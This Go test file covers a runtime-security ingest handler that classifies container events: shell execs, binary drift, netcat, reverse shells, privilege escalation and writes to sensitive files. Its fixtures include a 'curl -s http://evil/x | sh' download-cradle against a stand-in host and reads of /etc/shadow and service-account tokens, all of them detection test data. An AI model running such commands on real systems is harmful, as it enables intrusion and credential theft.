package runtime

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/alphabravocompany/constellation/internal/handler"
	"github.com/alphabravocompany/constellation/pkg/audit"
	"github.com/alphabravocompany/constellation/pkg/runtime/baseline"
)

// These tests exercise the pure-logic branches of the events-ingest handler — the
// classify() severity heuristic, the techniquesFor() ATT&CK mapping, the payload
// shape — without requiring a live Postgres. The DB-bound Bulk/List paths are
// covered by the integration test below (which auto-skips when DB is unreachable).

func TestEventsIngest_ClassifyShellInEnforce(t *testing.T) {
	orgID := uuid.New()
	bf := func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
		return baseline.ModeEnforce, map[string]struct{}{"nginx": {}}, true
	}
	h := NewEventsIngest(nil, nil, bf)

	// Shell exec not in baseline under Protect -> high / block.
	sev, verdict := h.classify(orgID, &IngestEvent{Kind: "process_exec", Comm: "sh", WorkloadID: "default/api"})
	if sev != "high" || verdict != "block" {
		t.Fatalf("expected high/block, got %s/%s", sev, verdict)
	}

	// Shell exec that IS in baseline -> medium (interesting binary, but baselined).
	bf2 := func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
		return baseline.ModeEnforce, map[string]struct{}{"sh": {}}, true
	}
	h2 := NewEventsIngest(nil, nil, bf2)
	sev, verdict = h2.classify(orgID, &IngestEvent{Kind: "process_exec", Comm: "sh", WorkloadID: "default/api"})
	if sev != "medium" || verdict != "observed" {
		t.Fatalf("expected medium/observed when in baseline, got %s/%s", sev, verdict)
	}

	// Non-shell exec -> info.
	sev, verdict = h.classify(orgID, &IngestEvent{Kind: "process_exec", Comm: "nginx", WorkloadID: "default/api"})
	if sev != "info" || verdict != "observed" {
		t.Fatalf("expected info/observed for non-shell, got %s/%s", sev, verdict)
	}

	// Shell exec in non-enforce mode -> medium (interesting, not blocking).
	bfLearn := func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
		return baseline.ModeLearn, nil, true
	}
	hLearn := NewEventsIngest(nil, nil, bfLearn)
	sev, _ = hLearn.classify(orgID, &IngestEvent{Kind: "process_exec", Comm: "sh", WorkloadID: "default/api"})
	if sev != "medium" {
		t.Fatalf("expected medium in learn mode, got %s", sev)
	}

	// Nil baseline fn -> medium (shell is interesting; we just can't promote).
	hNil := NewEventsIngest(nil, nil, nil)
	sev, _ = hNil.classify(orgID, &IngestEvent{Kind: "process_exec", Comm: "bash", WorkloadID: "default/api"})
	if sev != "medium" {
		t.Fatalf("expected medium with nil baseline, got %s", sev)
	}
}

// WS-F3 (a): image-provenance drift — an exec whose basename is NOT in the workload's
// baseline. enforce -> high/alert, monitor -> medium/alert, learn -> info (no signal).
func TestEventsIngest_ProvenanceDrift(t *testing.T) {
	orgID := uuid.New()
	mk := func(mode baseline.Mode) *EventsIngest {
		return NewEventsIngest(nil, nil, func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
			return mode, map[string]struct{}{"nginx": {}}, true
		})
	}
	ev := &IngestEvent{Kind: "process_exec", Comm: "curl", Filename: "/usr/bin/curl", WorkloadID: "default/api"}

	// enforce: drift of a non-baselined, non-shell binary -> high/block (Protect).
	cls := mk(baseline.ModeEnforce).classifyEvent(orgID, ev, nil, false)
	if cls.Severity != "high" || cls.Verdict != "block" || cls.Reason != "provenance-drift" {
		t.Fatalf("enforce drift = %+v", cls)
	}
	// monitor: same drift -> medium/alert.
	cls = mk(baseline.ModeMonitor).classifyEvent(orgID, ev, nil, false)
	if cls.Severity != "medium" || cls.Verdict != "alert" || cls.Reason != "provenance-drift" {
		t.Fatalf("monitor drift = %+v", cls)
	}
	// learn: no drift signal.
	cls = mk(baseline.ModeLearn).classifyEvent(orgID, ev, nil, false)
	if cls.Severity != "info" || cls.Reason != "" {
		t.Fatalf("learn drift should be info, got %+v", cls)
	}
	// baselined binary in enforce -> info (in allow-set).
	in := &IngestEvent{Kind: "process_exec", Comm: "nginx", Filename: "/usr/sbin/nginx", WorkloadID: "default/api"}
	cls = mk(baseline.ModeEnforce).classifyEvent(orgID, in, nil, false)
	if cls.Severity != "info" {
		t.Fatalf("baselined binary should be info, got %+v", cls)
	}
}

// P0-4: an agent-reported zero-drift exec (the agent's /proc provenance proxy flagged
// a binary that post-dates container start, or an unanchored process) is classified
// from the agent tag when no server-side baseline heuristic fired. Monitor observation
// -> medium/alert; a blocked (enforce / pre-exec deny) exec -> high/block.
func TestEventsIngest_AgentZeroDrift(t *testing.T) {
	orgID := uuid.New()
	// nil baseline fn: the server has NO baseline for this workload, so its own
	// provenance-drift path cannot fire — only the agent tag can.
	h := NewEventsIngest(nil, nil, nil)

	// monitor observation (not blocked) of a drifted non-shell binary -> medium/alert.
	mon := &IngestEvent{
		Kind: "process_exec", Comm: "evil", Filename: "/tmp/evil",
		WorkloadID: "default/api", ZeroDriftReason: "zero-drift:image-drift",
	}
	cls := h.classifyEvent(orgID, mon, nil, false)
	if cls.Severity != "medium" || cls.Verdict != "alert" || cls.Reason != "zero-drift:image-drift" {
		t.Fatalf("monitor zero-drift = %+v, want medium/alert/zero-drift:image-drift", cls)
	}

	// blocked (enforce / pre-exec deny) -> high/block.
	blk := &IngestEvent{
		Kind: "process_exec", Comm: "evil", Filename: "/tmp/evil",
		WorkloadID: "default/api", ZeroDriftReason: "zero-drift:unanchored", Blocked: true,
	}
	cls = h.classifyEvent(orgID, blk, nil, false)
	if cls.Severity != "high" || cls.Verdict != "block" || cls.Reason != "zero-drift:unanchored" {
		t.Fatalf("blocked zero-drift = %+v, want high/block/zero-drift:unanchored", cls)
	}

	// The drift reason must reach the stored payload (detection_reason) so it is
	// server-visible, not silently dropped.
	if payload := payloadFor(mon, cls); !bytes.Contains(payload, []byte(`"detection_reason"`)) {
		t.Fatalf("expected detection_reason in payload, got %s", payload)
	}

	// A server-side detection (suspicious binary) still wins over the agent tag.
	sus := &IngestEvent{
		Kind: "process_exec", Comm: "nc", WorkloadID: "default/api",
		ZeroDriftReason: "zero-drift:image-drift",
	}
	if cls = h.classifyEvent(orgID, sus, nil, false); cls.Reason != "suspicious-binary" {
		t.Fatalf("server detection should win over agent tag, got %+v", cls)
	}
}

// WS-F3 (b): a suspicious binary (netcat) is high regardless of baseline — even when it
// is, paradoxically, in the baseline set / learn mode.
func TestEventsIngest_SuspiciousBinary(t *testing.T) {
	orgID := uuid.New()
	// Even with nc in the baseline and learn mode, a suspicious binary still fires high.
	h := NewEventsIngest(nil, nil, func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
		return baseline.ModeLearn, map[string]struct{}{"nc": {}}, true
	})
	cls := h.classifyEvent(orgID, &IngestEvent{Kind: "process_exec", Comm: "nc", WorkloadID: "default/api"}, nil, false)
	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "suspicious-binary" {
		t.Fatalf("netcat exec = %+v", cls)
	}
	if got := techniquesForClassified(&IngestEvent{Kind: "process_exec", Comm: "nc"}, cls); len(got) != 2 {
		t.Fatalf("expected reverse-shell techniques (2), got %v", got)
	}

	// A curl|sh download-cradle in argv is suspicious even though curl alone is not.
	cls = h.classifyEvent(orgID, &IngestEvent{
		Kind: "process_exec", Comm: "sh", WorkloadID: "default/api",
		Args: []string{"sh", "-c", "curl -s http://evil/x | sh"},
	}, nil, false)
	if cls.Severity != "high" || cls.Reason != "suspicious-binary" {
		t.Fatalf("download-cradle = %+v", cls)
	}
}

// WS-F3 (c): privilege escalation — a root child of a non-root parent (correlated within
// the batch by PID/PPID) is high regardless of baseline.
func TestEventsIngest_PrivilegeEscalation(t *testing.T) {
	orgID := uuid.New()
	h := NewEventsIngest(nil, nil, nil)
	batch := []IngestEvent{
		{Kind: "process_exec", PID: 100, UID: 1000, Comm: "app", WorkloadID: "default/api"},
		{Kind: "process_exec", PID: 200, PPID: 100, UID: 0, Comm: "bash", WorkloadID: "default/api"},
	}
	uidByPID := buildUIDByPID(batch)
	if !privEscFromBatch(&batch[1], uidByPID) {
		t.Fatal("expected privesc for root child of non-root parent")
	}
	cls := h.classifyEvent(orgID, &batch[1], nil, privEscFromBatch(&batch[1], uidByPID))
	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "privilege-escalation" {
		t.Fatalf("privesc = %+v", cls)
	}
	if got := techniquesForClassified(&batch[1], cls); len(got) != 1 || got[0] != "T1068" {
		t.Fatalf("expected T1068, got %v", got)
	}
	// Root child of a root parent is NOT privesc.
	if privEscFromBatch(&IngestEvent{Kind: "process_exec", PID: 3, PPID: 100, UID: 0},
		map[uint32]uint32{100: 0}) {
		t.Fatal("root->root should not be privesc")
	}
}

// RT-4-FINISH: reverse-shell (StdioSocket on a suspicious/shell exec) and real-uid
// escalation (ruid!=0 && euid==0) — both driven by the agent's new /proc enrichment fields.
// Absent fields must leave classification unchanged.
func TestEventsIngest_ReverseShellAndRealUIDEscalation(t *testing.T) {
	orgID := uuid.New()
	h := NewEventsIngest(nil, nil, nil)

	// Reverse shell: bash with stdio redirected to a socket -> high / reverse-shell.
	rev := &IngestEvent{Kind: "process_exec", Comm: "bash", WorkloadID: "default/api", StdioSocket: true}
	cls := h.classifyEvent(orgID, rev, nil, false)
	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "reverse-shell" {
		t.Fatalf("reverse-shell = %+v", cls)
	}
	if got := techniquesForClassified(rev, cls); len(got) != 2 {
		t.Fatalf("expected reverse-shell techniques (2), got %v", got)
	}

	// StdioSocket on a benign, non-shell, non-suspicious exec is NOT a reverse shell.
	benign := &IngestEvent{Kind: "process_exec", Comm: "nginx", WorkloadID: "default/api", StdioSocket: true}
	if cls := h.classifyEvent(orgID, benign, nil, false); cls.Reason == "reverse-shell" {
		t.Fatalf("benign socket-stdio exec wrongly flagged: %+v", cls)
	}

	// Real-uid escalation: euid 0 with a non-root real uid (sudo / setuid) -> high.
	esc := &IngestEvent{Kind: "process_exec", Comm: "id", WorkloadID: "default/api",
		UID: 0, Ruid: 1000, RuidKnown: true}
	cls = h.classifyEvent(orgID, esc, nil, false)
	if cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "real-uid-escalation" {
		t.Fatalf("real-uid escalation = %+v", cls)
	}
	if got := techniquesForClassified(esc, cls); len(got) != 1 || got[0] != "T1068" {
		t.Fatalf("expected T1068, got %v", got)
	}

	// euid 0 with ruid 0 (genuinely root) is NOT an escalation.
	root := &IngestEvent{Kind: "process_exec", Comm: "id", WorkloadID: "default/api",
		UID: 0, Ruid: 0, RuidKnown: true}
	if realUIDEscalation(root) {
		t.Fatal("root->root must not be a real-uid escalation")
	}

	// Backward compatible: an exec WITHOUT the new fields classifies exactly as before
	// (a bare shell exec in a baseline-unknown workload is medium, not high).
	old := &IngestEvent{Kind: "process_exec", Comm: "bash", WorkloadID: "default/api"}
	if cls := h.classifyEvent(orgID, old, nil, false); cls.Severity != "medium" || cls.Reason != "" {
		t.Fatalf("absent enrichment changed classification: %+v", cls)
	}
}

// WS-F4: a write to /etc/passwd hits the default FIM watch-set -> file_modified / high.
func TestEventsIngest_FIMDefaultWrite(t *testing.T) {
	orgID := uuid.New()
	h := NewEventsIngest(nil, nil, nil)
	// Write (O_WRONLY) to /etc/passwd.
	cls := h.classifyEvent(orgID, &IngestEvent{
		Kind: "file_open", WorkloadID: "default/api", Path: "/etc/passwd", Flags: oWRONLY | oCREAT,
	}, &fileProfileRuleSet{}, false)
	if cls.FIM == nil || cls.Severity != "high" || cls.Verdict != "alert" || cls.Reason != "fim-default" {
		t.Fatalf("/etc/passwd write = %+v", cls)
	}
	if got := techniquesForClassified(&IngestEvent{Kind: "file_open", Path: "/etc/passwd"}, cls); len(got) == 0 {
		t.Fatalf("expected write-sensitive-file techniques, got %v", got)
	}

	// A read-only open of /etc/passwd is NOT a FIM modification (covered by read-sensitive).
	cls = h.classifyEvent(orgID, &IngestEvent{
		Kind: "file_open", WorkloadID: "default/api", Path: "/etc/passwd", Flags: 0, // O_RDONLY
	}, &fileProfileRuleSet{}, false)
	if cls.FIM != nil || cls.Severity != "info" {
		t.Fatalf("read-only /etc/passwd should not be a FIM write, got %+v", cls)
	}

	// A write to an unwatched path is info.
	cls = h.classifyEvent(orgID, &IngestEvent{
		Kind: "file_open", WorkloadID: "default/api", Path: "/tmp/scratch", Flags: oWRONLY,
	}, &fileProfileRuleSet{}, false)
	if cls.FIM != nil || cls.Severity != "info" {
		t.Fatalf("unwatched write should be info, got %+v", cls)
	}

	// A write to a system bin dir (binary tamper) is high.
	cls = h.classifyEvent(orgID, &IngestEvent{
		Kind: "file_open", WorkloadID: "default/api", Path: "/usr/bin/curl", Flags: oRDWR,
	}, &fileProfileRuleSet{}, false)
	if cls.FIM == nil || cls.Severity != "high" {
		t.Fatalf("system bin write = %+v", cls)
	}
}

func TestEventsIngest_ClassifyFileProfileRule(t *testing.T) {
	orgID := uuid.New()
	ruleID := uuid.New()
	rule := fileProfileRuntimeRule{
		ID:           ruleID,
		WorkloadID:   "default/api",
		ProfileMode:  fileProfileModeMonitor,
		Filter:       "/var/run/secrets/kubernetes.io/serviceaccount/*",
		Path:         "/var/run/secrets/kubernetes\\.io/serviceaccount",
		Regex:        ".*",
		Recursive:    false,
		Behavior:     "block_access",
		Applications: []string{"cat"},
		UpdatedAt:    time.Now().UTC(),
	}
	if err := compileFileProfileRuntimeRule(&rule); err != nil {
		t.Fatal(err)
	}
	exception := fileProfileRuntimeException{
		ID:           uuid.New(),
		RuleID:       ruleID,
		Filter:       "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
		Path:         "/var/run/secrets/kubernetes\\.io/serviceaccount/ca\\.crt",
		Applications: []string{"sh"},
		UpdatedAt:    time.Now().UTC(),
	}
	if err := compileFileProfileRuntimeException(&exception); err != nil {
		t.Fatal(err)
	}
	rule.Exceptions = []fileProfileRuntimeException{exception}
	rules := &fileProfileRuleSet{
		byWorkload: map[string][]fileProfileRuntimeRule{
			"default/api": {rule},
		},
		ownersByPod: map[string][]string{
			"default/pod/api-7d9c": {"default/api"},
		},
	}
	h := NewEventsIngest(nil, nil, nil)
	cls := h.classifyWithFileRules(orgID, &IngestEvent{
		Kind:       "file_open",
		WorkloadID: "default/pod/api-7d9c",
		Comm:       "cat",
		Path:       "/var/run/secrets/kubernetes.io/serviceaccount/token",
	}, rules)
	if cls.Severity != "info" || cls.Verdict != "observed" || cls.FileRule != nil {
		t.Fatalf("allowed application classification = %+v", cls)
	}

	cls = h.classifyWithFileRules(orgID, &IngestEvent{
		Kind:       "file_open",
		WorkloadID: "default/pod/api-7d9c",
		Comm:       "sh",
		Path:       "/var/run/secrets/kubernetes.io/serviceaccount/token",
	}, rules)
	if cls.Severity != "high" || cls.Verdict != "alert" || cls.FileRule == nil || !cls.FileRule.WouldBlock {
		t.Fatalf("classification = %+v", cls)
	}
	if cls.FileRule.ID != ruleID || cls.FileRule.WorkloadID != "default/api" {
		t.Fatalf("file rule match = %+v", cls.FileRule)
	}

	cls = h.classifyWithFileRules(orgID, &IngestEvent{
		Kind:       "file_open",
		WorkloadID: "default/pod/api-7d9c",
		Comm:       "sh",
		Path:       "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
	}, rules)
	if cls.Severity != "info" || cls.Verdict != "observed" || cls.FileRule != nil {
		t.Fatalf("exception classification = %+v", cls)
	}

	cls = h.classifyWithFileRules(orgID, &IngestEvent{
		Kind:              "file_open",
		WorkloadID:        "default/pod/api-7d9c",
		Comm:              "sh",
		Path:              "/var/run/secrets/kubernetes.io/serviceaccount/token",
		Blocked:           true,
		FileProfileRuleID: ruleID.String(),
	}, rules)
	if cls.Severity != "high" || cls.Verdict != "block" || cls.FileRule == nil || !cls.FileRule.WouldBlock {
		t.Fatalf("blocked classification = %+v", cls)
	}

	cls = h.classifyWithFileRules(orgID, &IngestEvent{
		Kind:       "file_open",
		WorkloadID: "default/pod/api-7d9c",
		Comm:       "sh",
		Path:       "/var/run/secrets/kubernetes.io/serviceaccount/token",
	}, &fileProfileRuleSet{byWorkload: map[string][]fileProfileRuntimeRule{}})
	if cls.Severity != "info" || cls.Verdict != "observed" || cls.FileRule != nil {
		t.Fatalf("non-matching rule classification = %+v", cls)
	}
}

func TestFileProfileRuntimeRulePathMatching(t *testing.T) {
	tests := []struct {
		name      string
		rule      fileProfileRuntimeRule
		path      string
		wantMatch bool
	}{
		{
			name: "exact escaped dot",
			rule: fileProfileRuntimeRule{Path: "/var/run/app\\.conf"},
			path: "/var/run/app.conf", wantMatch: true,
		},
		{
			name: "wildcard immediate child",
			rule: fileProfileRuntimeRule{Path: "/usr/bin", Regex: ".*"},
			path: "/usr/bin/cat", wantMatch: true,
		},
		{
			name: "wildcard non-recursive does not cross directory",
			rule: fileProfileRuntimeRule{Path: "/usr/bin", Regex: ".*"},
			path: "/usr/bin/tools/cat", wantMatch: false,
		},
		{
			name: "recursive wildcard crosses directory",
			rule: fileProfileRuntimeRule{Path: "/usr/bin", Regex: ".*", Recursive: true},
			path: "/usr/bin/tools/cat", wantMatch: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := compileFileProfileRuntimeRule(&tt.rule); err != nil {
				t.Fatal(err)
			}
			if got := tt.rule.filePathMatches(tt.path); got != tt.wantMatch {
				t.Fatalf("filePathMatches(%q)=%v want %v", tt.path, got, tt.wantMatch)
			}
		})
	}
}

func TestEventsIngest_TechniquesFor(t *testing.T) {
	cases := []struct {
		name string
		in   IngestEvent
		want []string
	}{
		{"shell exec", IngestEvent{Kind: "process_exec", Comm: "bash"}, []string{"T1059.004"}},
		{"non-shell exec", IngestEvent{Kind: "process_exec", Comm: "nginx"}, []string{}},
		{"public tcp connect", IngestEvent{Kind: "tcp_connect", Dst: "8.8.8.8:53"}, []string{"T1071", "T1041"}},
		{"private tcp connect", IngestEvent{Kind: "tcp_connect", Dst: "10.0.0.5:443"}, []string{}},
		{"sensitive file_open", IngestEvent{Kind: "file_open", Path: "/etc/shadow"}, []string{"T1552.001"}},
		{"unrelated file_open", IngestEvent{Kind: "file_open", Path: "/tmp/foo"}, []string{}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := techniquesFor(&c.in)
			if len(got) != len(c.want) {
				t.Fatalf("len mismatch: got %v want %v", got, c.want)
			}
			for i := range got {
				if got[i] != c.want[i] {
					t.Fatalf("at %d: got %s want %s", i, got[i], c.want[i])
				}
			}
		})
	}
}

func TestEventsIngest_BulkHappyPath(t *testing.T) {
	d := openTestDB(t)
	defer d.Close()

	ctx := context.Background()
	pool := d.Pool()

	// Use the first seed org or create one.
	var orgID uuid.UUID
	if err := pool.QueryRow(ctx, `SELECT id FROM orgs ORDER BY created_at LIMIT 1`).Scan(&orgID); err != nil {
		t.Skipf("no seed org: %v", err)
	}
	// Per-run unique workload id so the audit_events trigger doesn't carry rows from
	// prior runs into our assertions (audit_events is append-only by design).
	workloadID := "ingest-test/" + uuid.New().String()
	tokenName := "ingest-test-" + uuid.New().String()

	raw, _, err := handler.IssueRuntimeAgentToken(ctx, pool, orgID, tokenName, time.Hour)
	if err != nil {
		t.Fatalf("issue token: %v", err)
	}

	// Build a batch with one shell exec (high), one tcp_connect to public, one ordinary exec.
	batch := []IngestEvent{
		{
			At:         time.Now().UTC(),
			Kind:       "process_exec",
			Node:       "node-a",
			WorkloadID: workloadID,
			Namespace:  "ingest-test",
			Pod:        "api-xyz",
			PID:        1234, PPID: 1, UID: 0,
			Comm:     "sh",
			Filename: "/bin/sh",
		},
		{
			At:         time.Now().UTC(),
			Kind:       "tcp_connect",
			Node:       "node-a",
			WorkloadID: workloadID,
			PID:        1234,
			Comm:       "curl",
			Direction:  "connect",
			Protocol:   "tcp",
			Src:        "10.0.0.5:50000",
			Dst:        "1.1.1.1:443",
		},
		{
			At:         time.Now().UTC(),
			Kind:       "process_exec",
			Node:       "node-a",
			WorkloadID: workloadID,
			Comm:       "nginx",
			Filename:   "/usr/sbin/nginx",
		},
	}
	body, _ := json.Marshal(batch)

	// Build the handler with a baseline fn that returns enforce mode + nothing baselined,
	// so the shell exec promotes to high/alert.
	bf := func(_ uuid.UUID, _ string) (baseline.Mode, map[string]struct{}, bool) {
		return baseline.ModeEnforce, map[string]struct{}{"nginx": {}}, true
	}
	h := NewEventsIngest(d, audit.New(pool), bf)

	req := httptest.NewRequest("POST", "/api/v1/events:bulk", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+raw)
	w := httptest.NewRecorder()
	handler.RuntimeAgentTokenMiddleware(pool)(http.HandlerFunc(h.Bulk)).ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}
	var res IngestResponse
	_ = json.NewDecoder(w.Body).Decode(&res)
	if res.Accepted != 3 {
		t.Fatalf("accepted=%d want 3", res.Accepted)
	}
	if res.Alerts != 1 {
		t.Fatalf("alerts=%d want 1 (the shell-in-enforce exec)", res.Alerts)
	}

	// Verify rows in DB.
	var n int
	if err := pool.QueryRow(ctx,
		`SELECT count(*) FROM events WHERE org_id=$1 AND workload_id=$2`, orgID, workloadID).Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 3 {
		t.Fatalf("expected 3 events in DB, got %d", n)
	}
	var sev string
	if err := pool.QueryRow(ctx,
		`SELECT severity FROM events WHERE org_id=$1 AND workload_id=$2 AND kind='process_exec' AND payload->>'comm'='sh'`, orgID, workloadID).Scan(&sev); err != nil {
		t.Fatal(err)
	}
	if sev != "high" {
		t.Fatalf("shell exec severity=%s want high", sev)
	}

	// Verify the audit row was emitted.
	var auditCount int
	if err := pool.QueryRow(ctx,
		`SELECT count(*) FROM audit_events WHERE org_id=$1 AND action='runtime.alert.exec' AND target_id=$2`, orgID, workloadID).Scan(&auditCount); err != nil {
		t.Fatal(err)
	}
	if auditCount != 1 {
		t.Fatalf("audit rows=%d want 1", auditCount)
	}

	// Cleanup: events table allows DELETE, audit_events is append-only by design.
	t.Cleanup(func() {
		_, _ = pool.Exec(context.Background(), `DELETE FROM events WHERE org_id=$1 AND workload_id=$2`, orgID, workloadID)
		_, _ = pool.Exec(context.Background(), `DELETE FROM runtime_agent_tokens WHERE name = $1`, tokenName)
	})
}

func TestRuntimeAgentTokenMiddleware_Rejects(t *testing.T) {
	d := openTestDB(t)
	defer d.Close()

	r := httptest.NewRequest("POST", "/api/v1/events:bulk", nil)
	r.Header.Set("Authorization", "Bearer not-a-real-token")
	w := httptest.NewRecorder()
	called := false
	handler.RuntimeAgentTokenMiddleware(d.Pool())(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		called = true
	})).ServeHTTP(w, r)
	if called {
		t.Fatal("middleware passed through invalid token")
	}
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("status=%d", w.Code)
	}
}
